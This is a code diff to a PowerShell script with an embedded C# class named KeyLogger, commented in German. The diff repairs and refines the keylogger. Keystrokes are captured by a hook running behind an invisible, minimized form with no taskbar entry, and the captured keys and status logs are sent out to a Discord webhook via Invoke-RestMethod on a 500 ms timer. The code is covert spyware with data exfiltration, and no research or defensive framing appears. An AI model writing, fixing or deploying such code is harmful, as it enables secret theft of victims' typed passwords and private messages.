@@ -121,7 +121,7 @@ public static class KeyLogger
 
     public static void SendBuffer()
     {
-        while (_buffer.Length > 0)
+        if (_buffer.Length > 0)
         {
             string content = _buffer.ToString();
             if (content.Length > 1900)
@@ -154,7 +154,7 @@ public static class KeyLogger
         {
             File.AppendAllText(_logFile, DateTime.Now.ToString("o") + ": " + message + Environment.NewLine);
             // Sende wichtige Logs an Discord
-                                    if (message.Contains("Exception") || message.Contains("initialisiert") || message.Contains("gesendet"))"gesendet"))
+            if (message.Contains("Exception") || message.Contains("initialisiert") || message.Contains("gesendet"))
             {
                 if (!string.IsNullOrEmpty(_hookUrl))
                 {
@@ -183,37 +183,30 @@ try {
 $start = Get-Date
 $timeout = 120 # Sekunden
 
-# Lock-Objekt für SendBuffer-Synchronisierung
-$sendBufferLock = New-Object Object
-
-# Timer für Tasten-Überprüfung (alle 10ms)
-$checkTimer = New-Object System.Timers.Timer
+# Timer für Tasten-Überprüfung (alle 10ms) - Verwende Forms.Timer für STA-Kompatibilität
+$checkTimer = New-Object System.Windows.Forms.Timer
 $checkTimer.Interval = 10
-$checkTimer.AutoReset = $true
-$checkTimer.add_Elapsed({
+$checkTimer.add_Tick({
     [KeyLogger]::CheckKeys()
 })
-$checkTimer.Start()
+$checkTimer.Enabled = $true
 
 # Timer für regelmäßiges Senden (alle 500ms)
-$sendTimer = New-Object System.Timers.Timer
+$sendTimer = New-Object System.Windows.Forms.Timer
 $sendTimer.Interval = 500
-$sendTimer.AutoReset = $true
-$sendTimer.add_Elapsed({
-    [System.Threading.Monitor]::Enter($sendBufferLock)
-    try {
-        [KeyLogger]::SendBuffer()
-    } finally {
-        [System.Threading.Monitor]::Exit($sendBufferLock)
-    }
+$sendTimer.add_Tick({
+    [KeyLogger]::SendBuffer()
 })
-$sendTimer.Start()
+$sendTimer.Enabled = $true
 
-# Timer für Timeout (120 Sekunden)
+# Timer für Timeout (120 Sekunden) - Kann System.Timers bleiben, da kein UI-Call
 $timeoutTimer = New-Object System.Timers.Timer
 $timeoutTimer.Interval = $timeout * 1000
 $timeoutTimer.AutoReset = $false
 $timeoutTimer.add_Elapsed({
+    $checkTimer.Enabled = $false
+    $sendTimer.Enabled = $false
+    $timeoutTimer.Stop()
     [System.Windows.Forms.Application]::Exit()
 })
 $timeoutTimer.Start()
@@ -223,22 +216,19 @@ $form = New-Object System.Windows.Forms.Form
 $form.ShowInTaskbar = $false
 $form.WindowState = 'Minimized'
 $form.Opacity = 0
-$form.Visible = $true
+$form.Visible = $true  # Muss visible sein für Message-Loop, aber minimiert
 
-# Message-Loop für Hook
+# Message-Loop starten
 [System.Windows.Forms.Application]::Run($form)
 
-# Nach Timeout stoppen
-$checkTimer.Stop()
-$sendTimer.Stop()
-$timeoutTimer.Stop()
+# Nach Timeout stoppen und Rest senden
 [KeyLogger]::SendBuffer()  # Rest senden
 
 # Logger-Ende an Discord melden
-LogToFile("Logger beendet, sende Nachricht an Discord")
+[KeyLogger]::LogToFile("Logger beendet, sende Nachricht an Discord")
 try {
     Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
-    LogToFile("Beendigungs-Nachricht erfolgreich gesendet")
+    [KeyLogger]::LogToFile("Beendigungs-Nachricht erfolgreich gesendet")
 } catch {
-    LogToFile("Fehler beim Senden der Beendigungs-Nachricht: " + $_.Exception.Message)
+    [KeyLogger]::LogToFile("Fehler beim Senden der Beendigungs-Nachricht: " + $_.Exception.Message)
 }
